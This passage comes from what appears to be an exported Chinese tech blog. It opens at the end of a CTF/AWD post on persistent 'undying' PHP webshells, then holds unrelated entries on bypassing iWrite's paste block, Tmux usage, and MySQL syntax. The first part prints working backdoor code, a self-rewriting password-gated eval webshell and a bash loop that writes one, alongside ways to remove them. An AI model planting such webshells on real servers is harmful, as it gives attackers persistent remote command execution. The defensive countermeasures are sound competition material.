?&gt;&#x27;;</span><br><span class="line">//pass=Sn3rtf4ck 马儿用法：fuckyou.php?pass=Sn3rtf4ck&amp;a=command</span><br><span class="line">while (1)&#123;</span><br><span class="line">file_put_contents($file,$code);</span><br><span class="line">usleep(5000);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里添加了一个密码 <code>pass</code> 防止别人借刀杀人，我们平时也可以编写自己的木马，别人就算拿到木马也不知道怎么利用，附上一句话木马的各种变形</p><p><a href="http://www.secist.com/archives/1947.html">http://www.secist.com/archives/1947.html</a></p><p>bash 命令不死马，效果也是不断生成 <code>.index.php</code> 文件，也可以使用命令不断创建 nc 后门</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&#x27;while true;do echo \&#x27;&lt;?php  if(md5($_GET[pass])==\&quot;3a50065e1709acc47ba0c9238294364f\&quot;)&#123;@eval($_GET[a]);&#125; ?&gt;\&#x27; &gt;fuck.php;sleep 0.1;done;&#x27;);</span><br></pre></td></tr></table></figure><h2 id="6-2-不死马的克制"><a href="#6-2-不死马的克制" class="headerlink" title="6.2. 不死马的克制"></a>6.2. 不死马的克制</h2><ol><li>杀掉不死马运行的进程，直接删除脚本没用，因为php执行的时候已经把脚本读进去解释成opcode运行了</li></ol><p><code>ps aux</code> 查看运行的进程</p><p><a href="https://jlkl.github.io/2019/02/08/Web_13/20190207173536.png"><img src="https://jlkl.github.io/2019/02/08/Web_13/20190207173536.png" alt="img"></a></p><p>www-data 权限运行了 4 个 apache 进程，不死马随机运行于这 4 个进程，直接 <code>kill pid</code> （www-data 权限下）全部杀掉这几个进程就可以了</p><p>可以使用 <code>kill -9 -1</code> 杀死当前用户所有进程（有权限下慎用），也可以直接 <code>killall apache2</code> 杀掉 apache 所有子进程</p><ol><li>重启 apache，php 等web服务（一般不会有权限）</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service apache2 restart</span><br><span class="line">service php restart</span><br></pre></td></tr></table></figure><ol><li>用一个脚本竞争写入，脚本同不死马，usleep要低于对方不死马设置的值</li><li>创建一个和不死马生成的马一样名字的文件夹，测试了下需要先删除再创建文件夹</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>iWrite 不让粘贴的解决办法</title>
      <link href="/2022/09/08/iWrite-%E4%B8%8D%E8%AE%A9%E7%B2%98%E8%B4%B4%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/"/>
      <url>/2022/09/08/iWrite-%E4%B8%8D%E8%AE%A9%E7%B2%98%E8%B4%B4%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="iWrite-不让粘贴的解决办法"><a href="#iWrite-不让粘贴的解决办法" class="headerlink" title="iWrite 不让粘贴的解决办法"></a>iWrite 不让粘贴的解决办法</h1><p>打开写作界面，找到以下代码</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-09-08173843.png"></p><p>点击event,找到倒数第三个函数，直接禁用，就可以粘贴了！</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-09-08173942.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Tmux</title>
      <link href="/2022/09/06/Tmux/"/>
      <url>/2022/09/06/Tmux/</url>
      
        <content type="html"><![CDATA[<h2 id="一、Tmux-是什么？"><a href="#一、Tmux-是什么？" class="headerlink" title="一、Tmux 是什么？"></a>一、Tmux 是什么？</h2><h3 id="1-1-会话与进程"><a href="#1-1-会话与进程" class="headerlink" title="1.1 会话与进程"></a>1.1 会话与进程</h3><p>命令行的典型使用方式是，打开一个终端窗口（terminal window，以下简称”窗口”），在里面输入命令。<strong>用户与计算机的这种临时的交互，称为一次”会话”（session）</strong> 。</p><p>会话的一个重要特点是，窗口与其中启动的进程是<a href="https://www.ruanyifeng.com/blog/2016/02/linux-daemon.html">连在一起</a>的。打开窗口，会话开始；关闭窗口，会话结束，会话内部的进程也会随之终止，不管有没有运行完。</p><p>一个典型的例子就是，<a href="https://www.ruanyifeng.com/blog/2011/12/ssh_remote_login.html">SSH 登录</a>远程计算机，打开一个远程窗口执行命令。这时，网络突然断线，再次登录的时候，是找不回上一次执行的命令的。因为上一次 SSH 会话已经终止了，里面的进程也随之消失了。</p><p>为了解决这个问题，会话与窗口可以”解绑”：窗口关闭时，会话并不终止，而是继续运行，等到以后需要的时候，再让会话”绑定”其他窗口。</p><h3 id="1-2-Tmux-的作用"><a href="#1-2-Tmux-的作用" class="headerlink" title="1.2 Tmux 的作用"></a>1.2 Tmux 的作用</h3><p><strong>Tmux 就是会话与窗口的”解绑”工具，将它们彻底分离。</strong></p><blockquote><p>（1）它允许在单个窗口中，同时访问多个会话。这对于同时运行多个命令行程序很有用。</p><p>（2） 它可以让新窗口”接入”已经存在的会话。</p><p>（3）它允许每个会话有多个连接窗口，因此可以多人实时共享会话。</p><p>（4）它还支持窗口任意的垂直和水平拆分。</p></blockquote><p>类似的终端复用器还有 GNU Screen。Tmux 与它功能相似，但是更易用，也更强大。</p><h2 id="二、基本用法"><a href="#二、基本用法" class="headerlink" title="二、基本用法"></a>二、基本用法</h2><h3 id="2-1-安装"><a href="#2-1-安装" class="headerlink" title="2.1 安装"></a>2.1 安装</h3><p>Tmux 一般需要自己安装。</p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Ubuntu 或 Debian</span></span><br><span class="line">$ sudo apt-get install tmux</span><br><span class="line"></span><br><span class="line"><span class="comment"># CentOS 或 Fedora</span></span><br><span class="line">$ sudo yum install tmux</span><br><span class="line"></span><br><span class="line"><span class="comment"># Mac</span></span><br><span class="line">$ brew install tmux</span><br></pre></td></tr></table></figure></blockquote><h3 id="2-2-启动与退出"><a href="#2-2-启动与退出" class="headerlink" title="2.2 启动与退出"></a>2.2 启动与退出</h3><p>安装完成后，键入<code>tmux</code>命令，就进入了 Tmux 窗口。</p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ tmux</span><br></pre></td></tr></table></figure></blockquote><p>上面命令会启动 Tmux 窗口，底部有一个状态栏。状态栏的左侧是窗口信息（编号和名称），右侧是系统信息。</p><p><img src="https://www.wangbase.com/blogimg/asset/201910/bg2019102006.png" alt="img"></p><p>按下<code>Ctrl+d</code>或者显式输入<code>exit</code>命令，就可以退出 Tmux 窗口。</p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">exit</span></span><br></pre></td></tr></table></figure></blockquote><h3 id="2-3-前缀键"><a href="#2-3-前缀键" class="headerlink" title="2.3 前缀键"></a>2.3 前缀键</h3><p>Tmux 窗口有大量的快捷键。所有快捷键都要通过前缀键唤起。默认的前缀键是<code>Ctrl+b</code>，即先按下<code>Ctrl+b</code>，快捷键才会生效。</p><p>举例来说，帮助命令的快捷键是<code>Ctrl+b ?</code>。它的用法是，在 Tmux 窗口中，先按下<code>Ctrl+b</code>，再按下<code>?</code>，就会显示帮助信息。</p><p>然后，按下 ESC 键或<code>q</code>键，就可以退出帮助。</p><h2 id="三、会话管理"><a href="#三、会话管理" class="headerlink" title="三、会话管理"></a>三、会话管理</h2><h3 id="3-1-新建会话"><a href="#3-1-新建会话" class="headerlink" title="3.1 新建会话"></a>3.1 新建会话</h3><p>第一个启动的 Tmux 窗口，编号是<code>0</code>，第二个窗口的编号是<code>1</code>，以此类推。这些窗口对应的会话，就是 0 号会话、1 号会话。</p><p>使用编号区分会话，不太直观，更好的方法是为会话起名。</p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ tmux new -s &lt;session-name&gt;</span><br></pre></td></tr></table></figure></blockquote><p>上面命令新建一个指定名称的会话。</p><h3 id="3-2-分离会话"><a href="#3-2-分离会话" class="headerlink" title="3.2 分离会话"></a>3.2 分离会话</h3><p>在 Tmux 窗口中，按下<code>Ctrl+b d</code>或者输入<code>tmux detach</code>命令，就会将当前会话与窗口分离。</p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ tmux detach</span><br></pre></td></tr></table></figure></blockquote><p>上面命令执行后，就会退出当前 Tmux 窗口，但是会话和里面的进程仍然在后台运行。</p><p><code>tmux ls</code>命令可以查看当前所有的 Tmux 会话。</p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ tmux ls</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">$ tmux list-session</span><br></pre></td></tr></table></figure></blockquote><h3 id="3-3-接入会话"><a href="#3-3-接入会话" class="headerlink" title="3.3 接入会话"></a>3.3 接入会话</h3><p><code>tmux attach</code>命令用于重新接入某个已存在的会话。</p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用会话编号</span></span><br><span class="line">$ tmux attach -t 0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用会话名称</span></span><br><span class="line">$ tmux attach -t &lt;session-name&gt;</span><br></pre></td></tr></table></figure></blockquote><h3 id="3-4-杀死会话"><a href="#3-4-杀死会话" class="headerlink" title="3.4 杀死会话"></a>3.4 杀死会话</h3><p><code>tmux kill-session</code>命令用于杀死某个会话。</p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用会话编号</span></span><br><span class="line">$ tmux kill-session -t 0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用会话名称</span></span><br><span class="line">$ tmux kill-session -t &lt;session-name&gt;</span><br></pre></td></tr></table></figure></blockquote><h3 id="3-5-切换会话"><a href="#3-5-切换会话" class="headerlink" title="3.5 切换会话"></a>3.5 切换会话</h3><p><code>tmux switch</code>命令用于切换会话。</p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用会话编号</span></span><br><span class="line">$ tmux switch -t 0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用会话名称</span></span><br><span class="line">$ tmux switch -t &lt;session-name&gt;</span><br></pre></td></tr></table></figure></blockquote><h3 id="3-6-重命名会话"><a href="#3-6-重命名会话" class="headerlink" title="3.6 重命名会话"></a>3.6 重命名会话</h3><p><code>tmux rename-session</code>命令用于重命名会话。</p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ tmux rename-session -t 0 &lt;new-name&gt;</span><br></pre></td></tr></table></figure></blockquote><p>上面命令将0号会话重命名。</p><h3 id="3-7-会话快捷键"><a href="#3-7-会话快捷键" class="headerlink" title="3.7 会话快捷键"></a>3.7 会话快捷键</h3><p>下面是一些会话相关的快捷键。</p><blockquote><ul><li><code>Ctrl+b d</code>：分离当前会话。</li><li><code>Ctrl+b s</code>：列出所有会话。</li><li><code>Ctrl+b $</code>：重命名当前会话。</li></ul></blockquote><h2 id="四、最简操作流程"><a href="#四、最简操作流程" class="headerlink" title="四、最简操作流程"></a>四、最简操作流程</h2><p>综上所述，以下是 Tmux 的最简操作流程。</p><blockquote><ol><li>新建会话<code>tmux new -s my_session</code>。</li><li>在 Tmux 窗口运行所需的程序。</li><li>按下快捷键<code>Ctrl+b d</code>将会话分离。</li><li>下次使用时，重新连接到会话<code>tmux attach-session -t my_session</code>。</li></ol></blockquote><h2 id="五、窗格操作"><a href="#五、窗格操作" class="headerlink" title="五、窗格操作"></a>五、窗格操作</h2><p>Tmux 可以将窗口分成多个窗格（pane），每个窗格运行不同的命令。以下命令都是在 Tmux 窗口中执行。</p><h3 id="5-1-划分窗格"><a href="#5-1-划分窗格" class="headerlink" title="5.1 划分窗格"></a>5.1 划分窗格</h3><p><code>tmux split-window</code>命令用来划分窗格。</p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 划分上下两个窗格</span></span><br><span class="line">$ tmux split-window</span><br><span class="line"></span><br><span class="line"><span class="comment"># 划分左右两个窗格</span></span><br><span class="line">$ tmux split-window -h</span><br></pre></td></tr></table></figure></blockquote><p><img src="https://www.wangbase.com/blogimg/asset/201910/bg2019102007.jpg" alt="img"></p><h3 id="5-2-移动光标"><a href="#5-2-移动光标" class="headerlink" title="5.2 移动光标"></a>5.2 移动光标</h3><p><code>tmux select-pane</code>命令用来移动光标位置。</p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 光标切换到上方窗格</span></span><br><span class="line">$ tmux select-pane -U</span><br><span class="line"></span><br><span class="line"><span class="comment"># 光标切换到下方窗格</span></span><br><span class="line">$ tmux select-pane -D</span><br><span class="line"></span><br><span class="line"><span class="comment"># 光标切换到左边窗格</span></span><br><span class="line">$ tmux select-pane -L</span><br><span class="line"></span><br><span class="line"><span class="comment"># 光标切换到右边窗格</span></span><br><span class="line">$ tmux select-pane -R</span><br></pre></td></tr></table></figure></blockquote><h3 id="5-3-交换窗格位置"><a href="#5-3-交换窗格位置" class="headerlink" title="5.3 交换窗格位置"></a>5.3 交换窗格位置</h3><p><code>tmux swap-pane</code>命令用来交换窗格位置。</p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 当前窗格上移</span></span><br><span class="line">$ tmux swap-pane -U</span><br><span class="line"></span><br><span class="line"><span class="comment"># 当前窗格下移</span></span><br><span class="line">$ tmux swap-pane -D</span><br></pre></td></tr></table></figure></blockquote><h3 id="5-4-窗格快捷键"><a href="#5-4-窗格快捷键" class="headerlink" title="5.4 窗格快捷键"></a>5.4 窗格快捷键</h3><p>下面是一些窗格操作的快捷键。</p><blockquote><ul><li><code>Ctrl+b %</code>：划分左右两个窗格。</li><li><code>Ctrl+b &quot;</code>：划分上下两个窗格。</li><li><code>Ctrl+b &lt;arrow key&gt;</code>：光标切换到其他窗格。<code>&lt;arrow key&gt;</code>是指向要切换到的窗格的方向键，比如切换到下方窗格，就按方向键<code>↓</code>。</li><li><code>Ctrl+b ;</code>：光标切换到上一个窗格。</li><li><code>Ctrl+b o</code>：光标切换到下一个窗格。</li><li><code>Ctrl+b &#123;</code>：当前窗格与上一个窗格交换位置。</li><li><code>Ctrl+b &#125;</code>：当前窗格与下一个窗格交换位置。</li><li><code>Ctrl+b Ctrl+o</code>：所有窗格向前移动一个位置，第一个窗格变成最后一个窗格。</li><li><code>Ctrl+b Alt+o</code>：所有窗格向后移动一个位置，最后一个窗格变成第一个窗格。</li><li><code>Ctrl+b x</code>：关闭当前窗格。</li><li><code>Ctrl+b !</code>：将当前窗格拆分为一个独立窗口。</li><li><code>Ctrl+b z</code>：当前窗格全屏显示，再使用一次会变回原来大小。</li><li><code>Ctrl+b Ctrl+&lt;arrow key&gt;</code>：按箭头方向调整窗格大小。</li><li><code>Ctrl+b q</code>：显示窗格编号。</li></ul></blockquote><h2 id="六、窗口管理"><a href="#六、窗口管理" class="headerlink" title="六、窗口管理"></a>六、窗口管理</h2><p>除了将一个窗口划分成多个窗格，Tmux 也允许新建多个窗口。</p><h3 id="6-1-新建窗口"><a href="#6-1-新建窗口" class="headerlink" title="6.1 新建窗口"></a>6.1 新建窗口</h3><p><code>tmux new-window</code>命令用来创建新窗口。</p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ tmux new-window</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建一个指定名称的窗口</span></span><br><span class="line">$ tmux new-window -n &lt;window-name&gt;</span><br></pre></td></tr></table></figure></blockquote><h3 id="6-2-切换窗口"><a href="#6-2-切换窗口" class="headerlink" title="6.2 切换窗口"></a>6.2 切换窗口</h3><p><code>tmux select-window</code>命令用来切换窗口。</p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 切换到指定编号的窗口</span></span><br><span class="line">$ tmux select-window -t &lt;window-number&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 切换到指定名称的窗口</span></span><br><span class="line">$ tmux select-window -t &lt;window-name&gt;</span><br></pre></td></tr></table></figure></blockquote><h3 id="6-3-重命名窗口"><a href="#6-3-重命名窗口" class="headerlink" title="6.3 重命名窗口"></a>6.3 重命名窗口</h3><p><code>tmux rename-window</code>命令用于为当前窗口起名（或重命名）。</p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ tmux rename-window &lt;new-name&gt;</span><br></pre></td></tr></table></figure></blockquote><h3 id="6-4-窗口快捷键"><a href="#6-4-窗口快捷键" class="headerlink" title="6.4 窗口快捷键"></a>6.4 窗口快捷键</h3><p>下面是一些窗口操作的快捷键。</p><blockquote><ul><li><code>Ctrl+b c</code>：创建一个新窗口，状态栏会显示多个窗口的信息。</li><li><code>Ctrl+b p</code>：切换到上一个窗口（按照状态栏上的顺序）。</li><li><code>Ctrl+b n</code>：切换到下一个窗口。</li><li><code>Ctrl+b &lt;number&gt;</code>：切换到指定编号的窗口，其中的<code>&lt;number&gt;</code>是状态栏上的窗口编号。</li><li><code>Ctrl+b w</code>：从列表中选择窗口。</li><li><code>Ctrl+b ,</code>：窗口重命名。</li></ul></blockquote><h2 id="七、其他命令"><a href="#七、其他命令" class="headerlink" title="七、其他命令"></a>七、其他命令</h2><p>下面是一些其他命令。</p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 列出所有快捷键，及其对应的 Tmux 命令</span></span><br><span class="line">$ tmux list-keys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出所有 Tmux 命令及其参数</span></span><br><span class="line">$ tmux list-commands</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出当前所有 Tmux 会话的信息</span></span><br><span class="line">$ tmux info</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新加载当前的 Tmux 配置</span></span><br><span class="line">$ tmux source-file ~/.tmux.conf</span><br></pre></td></tr></table></figure></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MySQL 常用语法</title>
      <link href="/2022/08/12/MySQL-%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/"/>
      <url>/2022/08/12/MySQL-%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="一-DDL"><a href="#一-DDL" class="headerlink" title="一.DDL"></a>一.DDL</h2><h3 id="1-创建数据库"><a href="#1-创建数据库" class="headerlink" title="1.创建数据库"></a>1.创建数据库</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create database 数据库名称;</span><br></pre></td></tr></table></figure><h3 id="2-选择数据库语法"><a href="#2-选择数据库语法" class="headerlink" title="2.选择数据库语法"></a>2.选择数据库语法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use 数据库名称;</span><br></pre></td></tr></table></figure><h3 id="3-显示数据库中所有表语法"><a href="#3-显示数据库中所有表语法" class="headerlink" title="3.显示数据库中所有表语法"></a>3.显示数据库中所有表语法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show tables;</span><br></pre></td></tr></table></figure><h3 id="4-删除数据库语法"><a href="#4-删除数据库语法" class="headerlink" title="4.删除数据库语法"></a>4.删除数据库语法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop database 数据库名称;</span><br></pre></td></tr></table></figure><h3 id="5-创建表语法"><a href="#5-创建表语法" class="headerlink" title="5.创建表语法"></a>5.创建表语法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">create table 表名(</span><br><span class="line">列名1 列的类型</span><br><span class="line">列名2 列的类型</span><br><span class="line">列名3 列的类型</span><br><span class="line"></span><br><span class="line">);</span><br></pre></td></tr></table></figure><h3 id="6-常用数据类型"><a href="#6-常用数据类型" class="headerlink" title="6.常用数据类型"></a>6.常用数据类型</h3><h4 id="数值类型"><a href="#数值类型" class="headerlink" title="数值类型"></a>数值类型</h4><table><thead><tr><th>SMALLINT</th><th>2 字节</th><th>(-32 768，32 767)</th><th>(0，65 535)</th><th>大整数值</th></tr></thead><tbody><tr><td>MEDIUMINT</td><td>3 字节</td><td>(-8 388 608，8 388 607)</td><td>(0，16 777 215)</td><td>大整数值</td></tr><tr><td>INT或INTEGER</td><td>4 字节</td><td>(-2 147 483 648，2 147 483 647)</td><td>(0，4 294 967 295)</td><td>大整数值</td></tr><tr><td>BIGINT</td><td>8 字节</td><td>(-9 233 372 036 854 775 808，9 223 372 036 854 775 807)</td><td>(0，18 446 744 073 709 551 615)</td><td>极大整数值</td></tr><tr><td>FLOAT</td><td>4 字节</td><td>(-3.402 823 466 E+38，-1.175 494 351 E-38)，0，(1.175 494 351 E-38，3.402 823 466 351 E+38)</td><td>0，(1.175 494 351 E-38，3.402 823 466 E+38)</td><td>单精度 浮点数值</td></tr><tr><td>DOUBLE</td><td>8 字节</td><td>(-1.797 693 134 862 315 7 E+308，-2.225 073 858 507 201 4 E-308)，0，(2.225 073 858 507 201 4 E-308，1.797 693 134 862 315 7 E+308)</td><td>0，(2.225 073 858 507 201 4 E-308，1.797 693 134 862 315 7 E+308)</td><td>双精度 浮点数值</td></tr><tr><td>DECIMAL</td><td>对DECIMAL(M,D) ，如果M&gt;D，为M+2否则为D+2</td><td>依赖于M和D的值</td><td>依赖于M和D的值</td><td>小数值</td></tr></tbody></table><h4 id="日期和时间类型"><a href="#日期和时间类型" class="headerlink" title="日期和时间类型"></a>日期和时间类型</h4><table><thead><tr><th>类型</th><th>大小 (字节)</th><th>范围</th><th>格式</th><th>用途</th></tr></thead><tbody><tr><td>DATE</td><td>3</td><td>1000-01-01/9999-12-31</td><td>YYYY-MM-DD</td><td>日期值</td></tr><tr><td>TIME</td><td>3</td><td>‘-838:59:59’/‘838:59:59’</td><td>HH:MM:SS</td><td>时间值或持续时间</td></tr><tr><td>YEAR</td><td>1</td><td>1901/2155</td><td>YYYY</td><td>年份值</td></tr><tr><td>DATETIME</td><td>8</td><td>1000-01-01 00:00:00/9999-12-31 23:59:59</td><td>YYYY-MM-DD HH:MM:SS</td><td>混合日期和时间值</td></tr><tr><td>TIMESTAMP</td><td>4</td><td>1970-01-01 00:00:00/2038 结束时间是第 2147483647 秒，北京时间 2038-1-19 11:14:07，格林尼治时间 2038-1-19 03:14:07</td><td>YYYYMMDD HHMMSS</td><td>混合日期和时间值，时间戳</td></tr></tbody></table><h4 id="字符串类型"><a href="#字符串类型" class="headerlink" title="字符串类型"></a>字符串类型</h4><table><thead><tr><th>类型</th><th>大小</th><th>用途</th></tr></thead><tbody><tr><td>CHAR</td><td>0-255字节</td><td>定长字符串</td></tr><tr><td>VARCHAR</td><td>0-65535 字节</td><td>变长字符串</td></tr><tr><td>TINYBLOB</td><td>0-255字节</td><td>不超过 255 个字符的二进制字符串</td></tr><tr><td>TINYTEXT</td><td>0-255字节</td><td>短文本字符串</td></tr><tr><td>BLOB</td><td>0-65 535字节</td><td>二进制形式的长文本数据</td></tr><tr><td>TEXT</td><td>0-65 535字节</td><td>长文本数据</td></tr><tr><td>MEDIUMBLOB</td><td>0-16 777 215字节</td><td>二进制形式的中等长度文本数据</td></tr><tr><td>MEDIUMTEXT</td><td>0-16 777 215字节</td><td>中等长度文本数据</td></tr><tr><td>LONGBLOB</td><td>0-4 294 967 295字节</td><td>二进制形式的极大文本数据</td></tr><tr><td>LONGTEXT</td><td>0-4 294 967 295字节</td><td>极大文本数据</td></tr></tbody></table><p>提示：CHAR 和 VARCHAR 类型类似，但它们保存和检索的方式不同。它们的最大长度和是否尾部空格被保留等方面也不同。在存储或检索过程中不进行大小写转换。简单说：CHAR类型检索效率高，但是是定长，VARCHAR类型检索效率低，但是是变长。</p><h3 id="7-显示表结构（desc语法）"><a href="#7-显示表结构（desc语法）" class="headerlink" title="7.显示表结构（desc语法）"></a>7.显示表结构（desc语法）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">desc 表名;</span><br></pre></td></tr></table></figure><h3 id="8-删除表"><a href="#8-删除表" class="headerlink" title="8.删除表"></a>8.删除表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop table 表名;</span><br></pre></td></tr></table></figure><h3 id="9-修改列的类型语法"><a href="#9-修改列的类型语法" class="headerlink" title="9.修改列的类型语法"></a>9.修改列的类型语法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table 表名 modify 列名 列的类型;</span><br></pre></td></tr></table></figure><h3 id="10-添加列语法"><a href="#10-添加列语法" class="headerlink" title="10.添加列语法"></a>10.添加列语法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table 表名 add column 列名 类型;</span><br></pre></td></tr></table></figure><h3 id="11-删除表的列"><a href="#11-删除表的列" class="headerlink" title="11.删除表的列"></a>11.删除表的列</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table 表名 drop 列名;</span><br></pre></td></tr></table></figure><h3 id="12-修改列的名称"><a href="#12-修改列的名称" class="headerlink" title="12.修改列的名称"></a>12.修改列的名称</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table 表名 change 原始名称 新的名称 列的类型;</span><br></pre></td></tr></table></figure><h3 id="13-表改名"><a href="#13-表改名" class="headerlink" title="13.表改名"></a>13.表改名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table 表名 rename 新表名;</span><br></pre></td></tr></table></figure><h2 id="二-DML语句"><a href="#二-DML语句" class="headerlink" title="二.DML语句"></a>二.DML语句</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">DML是操作对数据库中表记录的操作</span><br><span class="line">主要表的记录操作有：</span><br><span class="line">插入(insert)</span><br><span class="line">查询(select)</span><br><span class="line">删除(delete)</span><br><span class="line">更改(update)</span><br></pre></td></tr></table></figure><h3 id="1-插入-insert-一次添加多条"><a href="#1-插入-insert-一次添加多条" class="headerlink" title="1.插入(insert)一次添加多条"></a>1.插入(insert)一次添加多条</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">insert into tablename(列名1，列名2.....列名n)</span><br><span class="line">,(值1，值2.......值n),</span><br><span class="line">,(值1，值2.......值n),</span><br><span class="line">,(值1，值2.......值n);</span><br><span class="line">#对于含可空列的，非空但是含有默认值的字段，自增字段，可以不用在insert后添加列名,values后面直接对应列就行</span><br></pre></td></tr></table></figure><h3 id="2-更改-update"><a href="#2-更改-update" class="headerlink" 